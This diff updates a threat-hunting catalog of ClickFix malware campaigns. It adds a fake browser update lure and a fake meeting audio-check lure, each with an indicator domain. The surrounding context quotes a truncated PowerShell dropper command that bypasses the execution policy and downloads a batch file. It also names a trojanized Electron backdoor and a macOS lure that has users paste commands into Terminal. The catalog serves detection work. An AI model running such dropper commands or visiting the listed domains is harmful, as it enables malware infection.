@@ -1,5 +1,5 @@
 # 📘 Detection Techniques & Pattern Catalog
-**Last Updated:** `2026-10-02 03:29:36 UTC`
+**Last Updated:** `2026-10-15 12:46:25 UTC`
 
 This catalog tracks every unique hunting query, obfuscation technique, C2 mechanism, and lure pattern observed by ClickFix-Tracker. Use this catalog to inspect newly evolving threat behaviors and write targeted decoders.
 
@@ -18,6 +18,8 @@ This catalog tracks every unique hunting query, obfuscation technique, C2 mechan
 | **Execution Vector / Dropper** | PowerShell CurrentUser Policy Bypass & Batch Dropper | `powershell -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; Invoke-WebRequest -Uri '.../KL.bat'..."` | `2026-10-02` | `yundatabox.com` |
 | **Payload / Persistence** | Trojanized Electron App / GitHub Desktop Backdoor | `resources/app/main.js backdoor (Stages: /r, /g.php)` | `2026-10-02` | `claudedevz.net -> cocuktekstil.com` |
 | **Social Engineering Lure** | Fake Secure Gateway (macOS Spotlight / Terminal) | `secure.gateway (Press Cmd+Space to open Spotlight, Type Terminal, Hit Cmd+V)` | `2026-10-02` | `secure.gateway` |
+| **Social Engineering Lure** | ClickFix Lure: Fake Web Browser Update Lure | `Lure: Fake Web Browser Update Lure` | `2026-10-15` | `nazmidemirdoger.com.tr` |
+| **Social Engineering Lure** | ClickFix Lure: Fake Online Meeting / Audio Check Lure | `Lure: Fake Online Meeting / Audio Check Lure` | `2026-10-15` | `1vv1sa837.life` |
 
 ## 🔍 Technique Details
 
@@ -111,3 +113,17 @@ This catalog tracks every unique hunting query, obfuscation technique, C2 mechan
 * **First Observed:** 2026-10-02
 * **Sample Indicator:** `secure.gateway`
 * **Description & Hunting Action:** Platform-aware ClickFix modal targeting macOS users instructing them to open Spotlight, launch Terminal, and execute obfuscated shell stagers.
+
+### ClickFix Lure: Fake Web Browser Update Lure (`cfmd_fake_web_browser_update_lure`)
+* **Category:** Social Engineering Lure
+* **Pattern / Signature:** `Lure: Fake Web Browser Update Lure`
+* **First Observed:** 2026-10-15
+* **Sample Indicator:** `nazmidemirdoger.com.tr`
+* **Description & Hunting Action:** Observed lure with an extracted URL in the rendered scan.
+
+### ClickFix Lure: Fake Online Meeting / Audio Check Lure (`cfmd_fake_online_meeting___audio_check_lure`)
+* **Category:** Social Engineering Lure
+* **Pattern / Signature:** `Lure: Fake Online Meeting / Audio Check Lure`
+* **First Observed:** 2026-10-15
+* **Sample Indicator:** `1vv1sa837.life`
+* **Description & Hunting Action:** Observed lure with an extracted URL in the rendered scan.
